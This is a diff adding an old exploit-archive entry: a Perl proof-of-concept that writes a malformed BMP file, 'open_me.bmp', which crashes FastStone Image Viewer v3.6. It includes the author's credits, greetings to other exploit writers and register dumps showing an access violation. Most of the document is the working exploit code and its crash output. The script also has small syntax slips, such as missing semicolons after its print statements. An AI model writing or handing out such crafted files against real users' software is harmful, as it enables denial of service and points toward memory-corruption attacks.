@@ -1,0 +1,39 @@
+Name      : FastStone Image Viewer v3.6 (malformed bmp image) DoS Exploit
+Credit    : suN8Hclf (DaRk-CodeRs Group), crimson.loyd@gmail.com
+Download: : http://www.FastStone.org
+Greetz    : Luigi Auriemma, 0in, cOndemned, e.wiZz!, Gynvael Coldwind, 
+            Katharsis, all from #dark-coders and others;]
+
+PoC:
+
+#!/usr/local/bin/perl   
+# Open file (File->Open) or simply click on the image miniature
+# FastStone Image Viewer v3.6 simply crashes
+# Tested on Windows 2000 SP4
+#-----INFO----------------------
+#EAX 00002847
+#ECX 00000000
+#EDX 00402818 dumped_F.00402818
+#EBX 00402818 dumped_F.00402818
+#ESP 00402818 dumped_F.00402818
+#EBP 0012DF08
+#ESI 00402818 dumped_F.00402818
+#EDI 000161E8
+#EIP 012F0447
+#
+#Reason: "Access violation when writing to [00002847]
+#-----INFO----------------------
+
+my $code="\x42\x4d\x3c\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00".
+         "\x00\x00\xcc\x5f\x01\x00\xe8\x61\x01\x00\x01\x00\x18\x00\x00\x00".
+         "\x00\x00\x06\x00\x00\x00\x98\x9e\x00\x00\x88\x77\x00\x00\xff\x02".
+         "\xfd\x00\x00\x00\x00\x00\x41";
+my $file="open_me.bmp";
+
+open(my $FILE, ">>$file") or die "[!]Cannot open file";
+print $FILE $code;
+close($FILE);
+print "$file has been generated\n"
+print "Credit: suN8Hclf, www.dark-coders.pl"
+
+# milw0rm.com [2008-10-05]
